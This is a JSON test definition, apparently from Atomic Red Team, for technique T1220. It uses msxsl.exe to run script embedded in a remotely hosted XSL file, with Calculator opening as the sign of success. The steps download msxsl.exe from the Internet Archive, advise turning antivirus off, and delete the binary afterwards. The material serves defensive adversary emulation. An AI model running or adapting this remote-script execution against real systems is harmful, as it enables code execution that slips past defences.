@@ -1,0 +1,117 @@
+{
+  "id": "a7c3ab07-52fb-49c8-ab6d-e9c6d4a0a985",
+  "name": "MSXSL Bypass using remote files",
+  "description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "e29f10da-3b13-48a9-849d-a088329a58ac",
+      "type": "execute-command",
+      "data": {
+        "command": "\"#{msxsl_exe}\" \"#{xmlfile}\" \"#{xslfile}\"\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "f3f44a7c-1652-4bef-91e8-7a1f18355e71",
+      "type": "execute-command",
+      "data": {
+        "command": "del -Path #{msxsl_exe} \u003enul 2\u003e\u00261\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8bd4cfa7-fa9a-45e8-b457-c2579452ae56",
+      "name": "Check dependency 1/1",
+      "description": "msxsl.exe must exist on disk at specified location (\"#{msxsl_exe}\")\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{msxsl_exe}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8968e980-ad38-4b08-b8c7-3e917ed42a91",
+      "name": "Resolve dependency 1/1",
+      "description": "msxsl.exe must exist on disk at specified location (\"#{msxsl_exe}\")\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Invoke-WebRequest \"https://web.archive.org/web/20200803205229if_/https://download.microsoft.com/download/f/2/6/f263ac46-1fe9-4ae9-8fd3-21102100ebf5/msxsl.exe\" -OutFile \"#{msxsl_exe}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5f7dd47f-7096-4d3f-9576-0e74a9b0a1e6",
+      "name": "Re-check dependency 1/1",
+      "description": "msxsl.exe must exist on disk at specified location (\"#{msxsl_exe}\")\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{msxsl_exe}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "e29f10da-3b13-48a9-849d-a088329a58ac",
+      "p": "on-success",
+      "o": "f3f44a7c-1652-4bef-91e8-7a1f18355e71"
+    },
+    {
+      "s": "e29f10da-3b13-48a9-849d-a088329a58ac",
+      "p": "on-failure",
+      "o": "f3f44a7c-1652-4bef-91e8-7a1f18355e71"
+    },
+    {
+      "s": "8bd4cfa7-fa9a-45e8-b457-c2579452ae56",
+      "p": "on-success",
+      "o": "e29f10da-3b13-48a9-849d-a088329a58ac"
+    },
+    {
+      "s": "8bd4cfa7-fa9a-45e8-b457-c2579452ae56",
+      "p": "on-failure",
+      "o": "8968e980-ad38-4b08-b8c7-3e917ed42a91"
+    },
+    {
+      "s": "8968e980-ad38-4b08-b8c7-3e917ed42a91",
+      "p": "on-success",
+      "o": "5f7dd47f-7096-4d3f-9576-0e74a9b0a1e6"
+    },
+    {
+      "s": "5f7dd47f-7096-4d3f-9576-0e74a9b0a1e6",
+      "p": "on-failure",
+      "o": "e29f10da-3b13-48a9-849d-a088329a58ac"
+    }
+  ],
+  "tags": [
+    "T1220",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "xmlfile",
+      "type": "url",
+      "description": "Remote location (URL) of the test XML file.",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml"
+    },
+    {
+      "name": "xslfile",
+      "type": "url",
+      "description": "Remote location (URL) of the test XSL script file.",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl"
+    },
+    {
+      "name": "msxsl_exe",
+      "type": "path",
+      "description": "Location of the MSXSL executable.",
+      "value": "PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe"
+    }
+  ]
+}
